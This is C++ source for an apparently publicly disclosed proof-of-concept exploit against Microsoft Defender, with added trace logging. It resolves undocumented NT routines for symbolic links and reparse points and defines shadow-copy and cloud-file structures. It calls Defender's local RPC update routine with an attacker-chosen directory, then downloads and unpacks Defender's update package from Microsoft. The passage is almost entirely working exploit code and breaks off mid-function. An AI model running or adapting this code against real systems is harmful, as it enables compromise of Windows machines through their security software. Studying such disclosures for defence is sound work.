// Special thanks to Tom Gallagher, Igor Tsyganskiy and Jeremy Tinder for making this PoC publicly disclosed !!!

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <wininet.h>
#include <string.h>
#include <fdi.h>
#include <fcntl.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <vector>
#include <ktmw32.h>
#include <wuapi.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <aclapi.h>
#include <stdarg.h>
#include "windefend_h.h"

#pragma message("BlueHammerFix trace build enabled: BHF-TRACE100-20260910-R2")

/*
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/provider.h>
#include <openssl/hmac.h>
*/
#include "offreg.h"
#define _NTDEF_
#include <ntsecapi.h>
#include <sddl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Cabinet.lib")
#pragma comment(lib, "Wuguid.lib")
#pragma comment(lib,"CldApi.lib")

static void LogV(const char* fmt, ...);
static void LogW(const char* fmt, ...);
static void LogE(const char* fmt, ...);
static LONG WINAPI TraceUnhandledException(EXCEPTION_POINTERS* info);
static const DWORD LAB_WAIT_TIMEOUT_MS = 120000;
static const DWORD TRACE_HEARTBEAT_MS = 1000;
static const DWORD WUA_ADVISORY_TIMEOUT_MS = 30000;
static DWORD WaitOneWithHeartbeat(HANDLE handle, DWORD timeoutms, const char* label);
static DWORD WaitManyWithHeartbeat(DWORD count, const HANDLE* handles,
	BOOL waitall, DWORD timeoutms, const char* label);


/// NT routines and definitions
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = (NTSTATUS(WINAPI*)(
		PHANDLE            DirectoryHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes
		))GetProcAddress(hm, "NtOpenDirectoryObject");;
NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
	HANDLE  DirectoryHandle,
	PVOID   Buffer,
	ULONG   Length,
	BOOLEAN ReturnSingleEntry,
	BOOLEAN RestartScan,
	PULONG  Context,
	PULONG  ReturnLength
	) = (NTSTATUS(WINAPI*)(
		HANDLE  DirectoryHandle,
		PVOID   Buffer,
		ULONG   Length,
		BOOLEAN ReturnSingleEntry,
		BOOLEAN RestartScan,
		PULONG  Context,
		PULONG  ReturnLength
		))GetProcAddress(hm, "NtQueryDirectoryObject");
NTSTATUS(WINAPI* _NtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	) = (NTSTATUS(WINAPI*)(
		HANDLE                 FileHandle,
		PIO_STATUS_BLOCK       IoStatusBlock,
		PVOID                  FileInformation,
		ULONG                  Length,
		FILE_INFORMATION_CLASS FileInformationClass
		))GetProcAddress(hm, "NtSetInformationFile");

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
	ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

//////////////// NT DEF END


// definitions of structures used by threads that invoke WD RPC calls
struct WDRPCWorkerThreadArgs
{
	HANDLE hevent;
	RPC_STATUS res;
	error_status_t serverstatus;
	wchar_t* dirpath;
};

typedef struct tagMPCOMPONENT_VERSION {
	ULONGLONG      Version;
	ULARGE_INTEGER UpdateTime;
} MPCOMPONENT_VERSION, * PMPCOMPONENT_VERSION;

typedef struct tagMPVERSION_INFO {
	MPCOMPONENT_VERSION Product;
	MPCOMPONENT_VERSION Service;
	MPCOMPONENT_VERSION FileSystemFilter;
	MPCOMPONENT_VERSION Engine;
	MPCOMPONENT_VERSION ASSignature;
	MPCOMPONENT_VERSION AVSignature;
	MPCOMPONENT_VERSION NISEngine;
	MPCOMPONENT_VERSION NISSignature;
	MPCOMPONENT_VERSION Reserved[4];
} MPVERSION_INFO, * PMPVERSION_INFO;

typedef union Version {
	struct {
		WORD major;
		WORD minor;
		WORD build;
		WORD revision;
	};
	ULONGLONG QuadPart;
};
//////////////////


// structures and global vars used by definition update functions
void* cabbuff2 = NULL;
DWORD cabbuffsz = 0;
struct CabOpArguments {
	ULONG index;
	char* filename;
	size_t ptroffset;
	char* buff;
	DWORD FileSize;
	CabOpArguments* first;
	CabOpArguments* next;
};

struct UpdateFiles {
	char filename[MAX_PATH];
	void* filebuff;
	DWORD filesz;
	bool filecreated;
	UpdateFiles* next;
};
///////////////////////////////////////


// structures and global vars used by volume shadow copy functions
struct cldcallbackctx {

	HANDLE hnotifywdaccess;
	HANDLE hnotifylockcreated;
	wchar_t filename[MAX_PATH];
};

struct LLShadowVolumeNames
{
	wchar_t* name;
	LLShadowVolumeNames* next;
};

struct cloudworkerthreadargs {
	HANDLE hlock;
	HANDLE hcleanupevent;
	HANDLE hvssready;
};
///////////////////////////////////////



//////////////////////////////////////////////////////////////////////
// Functions required by RPC
/////////////////////////////////////////////////////////////////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
//////////////////////////////////////////////////////////////////////
// Functions required by RPC end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD RPC functions
/////////////////////////////////////////////////////////////////////
void CallWD(WDRPCWorkerThreadArgs* args)
{
	LogV("[RPC] Worker entered; update directory=%ws\n",
		(args && args->dirpath) ? args->dirpath : L"(null)");
	if (!args)
	{
		LogE("[RPC] Worker received a null argument");
		return;
	}
	args->res = RPC_S_CALL_FAILED;
	args->serverstatus = ERROR_GEN_FAILURE;
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding = NULL;
	RPC_STATUS rpcres = RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding);
	if (rpcres != RPC_S_OK)
	{
		args->res = rpcres;
		LogE("[RPC] RpcStringBindingComposeW failed: 0x%08lX", (unsigned long)rpcres);
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	LogV("[RPC] String binding composed\n");
	RPC_BINDING_HANDLE bindhandle = 0;
	rpcres = RpcBindingFromStringBindingW(StringBinding, &bindhandle);
	RpcStringFreeW(&StringBinding);
	if (rpcres != RPC_S_OK)
	{
		args->res = rpcres;
		LogE("[RPC] RpcBindingFromStringBindingW failed: 0x%08lX", (unsigned long)rpcres);
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	LogV("[RPC] Binding established; invoking Proc42_ServerMpUpdateEngineSignature\n");
	// PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update.
	error_status_t errstat = 0;
	RPC_STATUS stat = RPC_S_CALL_FAILED;
	#if defined(_MSC_VER)
	RpcTryExcept
	{
		stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	}
	RpcExcept(1)
	{
		stat = RpcExceptionCode();
		errstat = stat;
		LogE("[RPC] Proc42 raised an RPC exception: 0x%08lX", (unsigned long)stat);
	}
	RpcEndExcept
	#else
	// MinGW-w64 does not provide compiler-level support for Microsoft's
	// __try/__except syntax used by RpcTryExcept. Keep the RPC call ABI-identical.
	stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	#endif
	args->res = stat;
	args->serverstatus = errstat;
	LogV("[RPC] Proc42 returned: return=0x%08lX, server_status=0x%08lX\n",
		(unsigned long)stat, (unsigned long)errstat);
	RPC_STATUS freestatus = RpcBindingFree(&bindhandle);
	if (freestatus != RPC_S_OK)
		LogE("[RPC] RpcBindingFree failed: 0x%08lX", (unsigned long)freestatus);
	if (args->hevent)
	{
		if (!SetEvent(args->hevent))
			LogE("[RPC] SetEvent(worker completion) failed: %lu", GetLastError());
	}

}

DWORD WINAPI WDCallerThread(void* args)
{
	if (!args)
		return ERROR_BAD_ARGUMENTS;
	CallWD((WDRPCWorkerThreadArgs*)args);
	return ERROR_SUCCESS;

}
//////////////////////////////////////////////////////////////////////
// WD RPC functions end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD definition update functions
/////////////////////////////////////////////////////////////////////

CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{

	CabOpArguments* cbps = (CabOpArguments*)malloc(sizeof(CabOpArguments));
	ZeroMemory(cbps, sizeof(CabOpArguments));
	cbps->buff = (char*)cabbuff2;
	cbps->FileSize = cabbuffsz;
	return cbps;
}

INT CUST_FNSEEK(HANDLE hf,
	long offset,
	int origin)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (origin == SEEK_SET)
			CabOpArgs->ptroffset = offset;
		if (origin == SEEK_CUR)
			CabOpArgs->ptroffset += offset;
		if (origin == SEEK_END)
			CabOpArgs->ptroffset += CabOpArgs->FileSize;

		return CabOpArgs->ptroffset;

	}

	return -1;
}


UINT CUST_FNREAD(CabOpArguments* hf,
	void* const buffer,
	unsigned const buffer_size)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (CabOpArgs->buff)
		{

			memmove(buffer, &CabOpArgs->buff[CabOpArgs->ptroffset], buffer_size);
			CabOpArgs->ptroffset += buffer_size;
			//CabOpArgs->ReadBytes += buffer_size;
			return buffer_size;
		}
	}

	return NULL;
}

UINT CUST_FNWRITE(CabOpArguments* hf,
	const void* buffer,
	unsigned int count)
{

	if (hf)
	{
		if (hf->buff) {
			memmove(&hf->buff[hf->ptroffset], buffer, count);
			hf->ptroffset += count;
			return count;
		}
	}


	return NULL;
}

INT CUST_FNCLOSE(CabOpArguments* fnFileClose)
{

	free(fnFileClose);
	return 0;
}

VOID* CUST_FNALLOC(size_t cb)
{
	return malloc(cb);
}

VOID CUST_FNFREE(void* buff)
{
	free(buff);
}

INT_PTR CUST_FNFDINOTIFY(
	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
) {

	LogV("[FDI] Notification type=%d payload=%p\n", (int)fdinotify, pfdin);
	wchar_t newfile[MAX_PATH] = { 0 };
	wchar_t filename[MAX_PATH] = { 0 };
	HANDLE hfile = NULL;
	ULONG rethandle = 0;
	CabOpArguments** ptr = NULL;
	CabOpArguments* lcab = NULL;
	switch (fdinotify)
	{
	case fdintCOPY_FILE:
		if (!pfdin || !pfdin->psz1)
		{
			LogE("[FDI] COPY_FILE notification has no filename");
			return -1;
		}
		LogV("[FDI] COPY_FILE name=%s size=%ld\n", pfdin->psz1, pfdin->cb);
		if (_stricmp(pfdin->psz1, "MpSigStub.exe") == 0)
		{
			LogV("[FDI] Skipping MpSigStub.exe\n");
			return NULL;
		}

		ptr = (CabOpArguments**)pfdin->pv;
		lcab = *ptr;
		if (lcab == NULL) {
			lcab = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab, sizeof(CabOpArguments));
			lcab->first = lcab;
			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);


		}
		else
		{


			lcab->next = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab->next, sizeof(CabOpArguments));
			lcab->next->first = lcab->first;
			lcab = lcab->next;

			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);
		}

		lcab->first->index++;
		*ptr = lcab;
		LogV("[FDI] Accepted member #%lu: name=%s buffer=%p\n",
			lcab->first->index, lcab->filename, lcab->buff);

		return (INT_PTR)lcab;
		break;
	case fdintCLOSE_FILE_INFO:
		LogV("[FDI] CLOSE_FILE_INFO name=%s\n",
			(pfdin && pfdin->psz1) ? pfdin->psz1 : "(unknown)");
		return TRUE;
		break;
	default:
		LogV("[FDI] Notification type=%d requires no action\n", (int)fdinotify);
		return 0;
	}
	return 0;
}

void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
	LogV("[PE-CAB] Parser entered: buffer=%p size=%lu\n", pvRawData, cbRawData);
	if (!pvRawData)
	{
		LogE("[PE-CAB] Input buffer is NULL");
		SetLastError(ERROR_INVALID_PARAMETER);
		return 0;
	}
	if (cbRawData < sizeof(IMAGE_DOS_HEADER))
	{
		LogE("[PE-CAB] Buffer is smaller than IMAGE_DOS_HEADER: size=%lu", cbRawData);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}

	if (pvRawData->e_magic != IMAGE_DOS_SIGNATURE)
	{
		LogE("[PE-CAB] DOS signature mismatch: actual=0x%04X expected=0x%04X",
			pvRawData->e_magic, IMAGE_DOS_SIGNATURE);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}
	LogV("[PE-CAB] DOS header accepted: e_lfanew=%ld\n", pvRawData->e_lfanew);

	ULONG e_lfanew = pvRawData->e_lfanew, s = e_lfanew + sizeof(IMAGE_NT_HEADERS);

	if (e_lfanew >= s || s > cbRawData)
	{
		LogE("[PE-CAB] NT-header offset is outside the buffer: offset=%lu end=%lu size=%lu",
			e_lfanew, s, cbRawData);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}

	PIMAGE_NT_HEADERS pinth = (PIMAGE_NT_HEADERS)RtlOffsetToPointer(pvRawData, e_lfanew);



	if (pinth->Signature != IMAGE_NT_SIGNATURE)
	{
		LogE("[PE-CAB] NT signature mismatch: actual=0x%08lX expected=0x%08lX",
			(unsigned long)pinth->Signature, (unsigned long)IMAGE_NT_SIGNATURE);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}
	LogV("[PE-CAB] NT header accepted: sections=%u optional_header=%u\n",
		pinth->FileHeader.NumberOfSections, pinth->FileHeader.SizeOfOptionalHeader);

	ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage, SizeOfHeaders = pinth->OptionalHeader.SizeOfHeaders;

	s = e_lfanew + SizeOfHeaders;

	if (SizeOfHeaders > SizeOfImage || SizeOfHeaders >= s || s > cbRawData)
	{
		LogE("[PE-CAB] Invalid image/header sizes: image=%lu headers=%lu computed_end=%lu file=%lu",
			SizeOfImage, SizeOfHeaders, s, cbRawData);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}

	s = FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + pinth->FileHeader.SizeOfOptionalHeader;

	if (s > SizeOfHeaders)
	{
		LogE("[PE-CAB] Optional header extends beyond SizeOfHeaders: end=%lu headers=%lu",
			s, SizeOfHeaders);
		SetLastError(ERROR_BAD_FORMAT);
		return 0;
	}

	ULONG NumberOfSections = pinth->FileHeader.NumberOfSections;

	PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)RtlOffsetToPointer(pinth, s);

	ULONG Size;

	if (NumberOfSections)
	{
		if (e_lfanew + s + NumberOfSections * sizeof(IMAGE_SECTION_HEADER) > SizeOfHeaders)
		{
			LogE("[PE-CAB] Section table extends beyond headers");
			SetLastError(ERROR_BAD_FORMAT);
			return 0;
		}

		do
		{
			if (Size = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				LogV("[PE-CAB] Section name=%.8s virtual=%lu raw=%lu size=%lu\n",
					pish->Name, pish->VirtualAddress, pish->PointerToRawData, Size);
				union {
					ULONG VirtualAddress, PointerToRawData;
				};

				VirtualAddress = pish->VirtualAddress, s = VirtualAddress + Size;

				if (VirtualAddress > s || s > SizeOfImage)
				{
					LogE("[PE-CAB] Section virtual range is invalid");
					SetLastError(ERROR_BAD_FORMAT);
					return 0;
				}

				PointerToRawData = pish->PointerToRawData, s = PointerToRawData + Size;

				if (PointerToRawData > s || s > cbRawData)
				{
					LogE("[PE-CAB] Section raw range is invalid");
					SetLastError(ERROR_BAD_FORMAT);
					return 0;
				}

				char rsrc[] = ".rsrc";
				if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
				{
					LogV("[PE-CAB] Resource section located\n");
					typedef struct _IMAGE_RESOURCE_DIRECTORY2 {
						DWORD   Characteristics;
						DWORD   TimeDateStamp;
						WORD    MajorVersion;
						WORD    MinorVersion;
						WORD    NumberOfNamedEntries;
						WORD    NumberOfIdEntries;
						IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];
					} IMAGE_RESOURCE_DIRECTORY2, * PIMAGE_RESOURCE_DIRECTORY2;

					PIMAGE_RESOURCE_DIRECTORY2 pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(pvRawData, pish->PointerToRawData);

					PIMAGE_RESOURCE_DIRECTORY2 prsrc = pird;
					PIMAGE_RESOURCE_DIRECTORY_ENTRY pirde = { 0 };
					PIMAGE_RESOURCE_DATA_ENTRY pdata = 0;

					while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries)
					{




						pirde = &pird->DirectoryEntries[0];
						if (!pirde->DataIsDirectory)
						{
							pdata = (PIMAGE_RESOURCE_DATA_ENTRY)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
							pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
							void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
							if (cabsz)
								*cabsz = pdata->Size;
							LogV("[PE-CAB] Cabinet resource located: offset=%lu size=%lu address=%p\n",
								pdata->OffsetToData, pdata->Size, cabfile);
							return cabfile;
						}
						pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
					}
					break;




				}



			}

		} while (pish++, --NumberOfSections);
	}
	LogE("[PE-CAB] No cabinet resource was found");
	SetLastError(ERROR_RESOURCE_DATA_NOT_FOUND);
	return NULL;

}

static const wchar_t UPDATE_CACHE_NAME[] = L"mpam-fe-x64.exe";

static bool BuildUpdateCachePath(wchar_t* cachepath, DWORD cachechars)
{
	DWORD len = GetModuleFileNameW(NULL, cachepath, cachechars);
	if (!len || len >= cachechars)
		return false;

	wchar_t* slash = wcsrchr(cachepath, L'\\');
	if (!slash)
		return false;
	slash[1] = L'\0';

	if (wcslen(cachepath) + wcslen(UPDATE_CACHE_NAME) + 1 > cachechars)
		return false;
	wcscat(cachepath, UPDATE_CACHE_NAME);
	return true;
}

static bool ReadUpdateCache(const wchar_t* cachepath, void** outbuff, DWORD* outsize)
{
	if (!cachepath || !outbuff || !outsize)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return false;
	}
	HANDLE file = CreateFileW(cachepath, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		LogV("[CACHE] Cache open failed: path=%ws, error=%lu\n", cachepath, GetLastError());
		return false;
	}

	LARGE_INTEGER size = { 0 };
	BOOL sizeok = GetFileSizeEx(file, &size);
	if (!sizeok || size.QuadPart <= 0 || size.QuadPart > MAXDWORD)
	{
		DWORD sizeerror = sizeok ? ERROR_BAD_LENGTH : GetLastError();
		CloseHandle(file);
		SetLastError(sizeerror);
		LogW("[CACHE] Cache size is invalid: path=%ws, error=%lu", cachepath, sizeerror);
		return false;
	}

	DWORD total = (DWORD)size.QuadPart;
	BYTE* data = (BYTE*)malloc(total);
	if (!data)
	{
		CloseHandle(file);
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		LogE("[CACHE] Cache allocation failed: size=%lu", total);
		return false;
	}

	DWORD done = 0;
	DWORD chunkindex = 0;
	while (done < total)
	{
		DWORD remaining = total - done;
		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
		DWORD got = 0;
		if (!ReadFile(file, data + done, chunk, &got, NULL) || !got)
		{
			DWORD readerror = got ? GetLastError() : ERROR_HANDLE_EOF;
			free(data);
			CloseHandle(file);
			SetLastError(readerror);
			LogW("[CACHE] Cache read failed: offset=%lu, total=%lu, error=%lu",
				done, total, readerror);
			return false;
		}
		done += got;
		chunkindex++;
		LogV("[CACHE-READ] chunk=%lu bytes=%lu progress=%lu/%lu (%lu%%)\n",
			chunkindex, got, done, total,
			(unsigned long)((done * 100ULL) / total));
	}

	CloseHandle(file);
	*outbuff = data;
	*outsize = total;
	SetLastError(ERROR_SUCCESS);
	return true;
}

static bool WriteUpdateCache(const wchar_t* cachepath, const void* buff, DWORD size)
{
	wchar_t temppath[MAX_PATH] = { 0 };
	if (wcslen(cachepath) + 5 > MAX_PATH)
	{
		SetLastError(ERROR_BUFFER_OVERFLOW);
		return false;
	}
	wsprintfW(temppath, L"%s.tmp", cachepath);

	HANDLE file = CreateFileW(temppath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return false;

	const BYTE* data = (const BYTE*)buff;
	DWORD done = 0;
	DWORD chunkindex = 0;
	DWORD saveerror = ERROR_SUCCESS;
	while (done < size)
	{
		DWORD remaining = size - done;
		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
		DWORD written = 0;
		if (!WriteFile(file, data + done, chunk, &written, NULL) || !written)
		{
			saveerror = GetLastError();
			break;
		}
		done += written;
		chunkindex++;
		LogV("[CACHE-WRITE] chunk=%lu bytes=%lu progress=%lu/%lu (%lu%%)\n",
			chunkindex, written, done, size,
			(unsigned long)((done * 100ULL) / size));
	}

	if (saveerror == ERROR_SUCCESS && !FlushFileBuffers(file))
		saveerror = GetLastError();
	CloseHandle(file);

	if (saveerror == ERROR_SUCCESS && !MoveFileExW(temppath, cachepath,
		MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
		saveerror = GetLastError();

	if (saveerror != ERROR_SUCCESS)
	{
		DeleteFileW(temppath);
		SetLastError(saveerror);
		return false;
	}
	return true;
}


UpdateFiles* GetUpdateFiles(int* filecount = NULL)
{



	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	HANDLE htransaction = NULL;
	char fname[] = "update.cab";
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	bool extractres = false;
	DWORD totalsz = 0;
	HANDLE hmpeng = NULL;
	CabOpArguments* CabOpArgs = NULL;
	CabOpArguments* cabhead = NULL;
	CabOpArguments* cabcursor = NULL;
	CabOpArguments* mpenginedata = NULL;
	void* dllview = NULL;
	char** filesmtrx = 0;
	UpdateFiles* firstupdt = NULL;
	UpdateFiles* current = NULL;
	wchar_t cachepath[MAX_PATH] = { 0 };
	bool havecachepath = BuildUpdateCachePath(cachepath, MAX_PATH);
	bool loadedfromcache = false;
	bool skipcache = false;
	bool cachefallbackused = false;
	bool updatesbuilt = false;
	DWORD failcode = ERROR_SUCCESS;
	const char* failreason = "completed";

	DWORD nbytes = 0;
	DWORD extractedcount = 0;

#define UPDATE_FAIL(reason, code) \
	do { \
		failreason = (reason); failcode = (DWORD)(code); \
		LogE("[UPDATE] Exit: reason=%s, code=0x%08lX", \
			failreason, (unsigned long)failcode); \
		goto cleanup; \
	} while (0)

	LogV("[UPDATE] GetUpdateFiles entered\n");
	if (filecount)
		*filecount = 0;
	if (havecachepath)
		LogV("[UPDATE] Cache path=%ws\n", cachepath);
	else
		LogE("[UPDATE] Could not construct the cache path; network-only mode will be used");

acquirepackage:
	loadedfromcache = false;
	if (!skipcache && havecachepath && ReadUpdateCache(cachepath, &exebuff, &sz))
	{
		loadedfromcache = true;
		LogV("Using cached update package: %ws (%lu bytes)\n", cachepath, sz);
	}
	else
	{
		if (havecachepath && GetFileAttributesW(cachepath) != INVALID_FILE_ATTRIBUTES)
			LogV("Cached package could not be read; downloading a fresh copy.\n");

		LogV("Downloading update package from Microsoft CDN...\n");
		hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		if (!hint)
			UPDATE_FAIL("InternetOpen failed", GetLastError());
		LogV("[UPDATE] Internet session opened\n");
		DWORD connecttimeout = 15000;
		DWORD receivetimeout = 30000;
		BOOL connectoption = InternetSetOptionW(hint, INTERNET_OPTION_CONNECT_TIMEOUT,
			&connecttimeout, sizeof(connecttimeout));
		DWORD connectoptionerror = connectoption ? ERROR_SUCCESS : GetLastError();
		BOOL receiveoption = InternetSetOptionW(hint, INTERNET_OPTION_RECEIVE_TIMEOUT,
			&receivetimeout, sizeof(receivetimeout));
		DWORD receiveoptionerror = receiveoption ? ERROR_SUCCESS : GetLastError();
		LogV("[UPDATE] WinInet timeouts: connect=%lu ms (%s/error=%lu), receive=%lu ms (%s/error=%lu)\n",
			connecttimeout, connectoption ? "set" : "not-set", connectoptionerror,
			receivetimeout, receiveoption ? "set" : "not-set", receiveoptionerror);

		LogV("[UPDATE] Opening Microsoft redirect URL\n");
		hint2 = InternetOpenUrl(hint, L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64", NULL, NULL, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
		if (!hint2)
			UPDATE_FAIL("InternetOpenUrl failed", GetLastError());
		LogV("[UPDATE] CDN URL opened\n");
		DWORD httpstatus = 0;
		DWORD httpstatussize = sizeof(httpstatus);
		BOOL httpstatusok = HttpQueryInfoW(hint2,
			HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
			&httpstatus, &httpstatussize, NULL);
		DWORD httpstatuserror = httpstatusok ? ERROR_SUCCESS : GetLastError();
		wchar_t finalurl[1024] = { 0 };
		DWORD finalurlbytes = sizeof(finalurl);
		BOOL finalurlok = InternetQueryOptionW(hint2, INTERNET_OPTION_URL,
			finalurl, &finalurlbytes);
		DWORD finalurlerror = finalurlok ? ERROR_SUCCESS : GetLastError();
		LogV("[UPDATE] HTTP response: status_ok=%s status=%lu error=%lu\n",
			httpstatusok ? "yes" : "no", httpstatus, httpstatuserror);
		LogV("[UPDATE] Resolved URL: ok=%s bytes=%lu error=%lu value=%ws\n",
			finalurlok ? "yes" : "no", finalurlbytes, finalurlerror,
			finalurlok ? finalurl : L"(unavailable)");

		res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
		if (!res2)
			UPDATE_FAIL("HTTP content-length query failed", GetLastError());

		wcscpy(filesz, (LPWSTR)data);
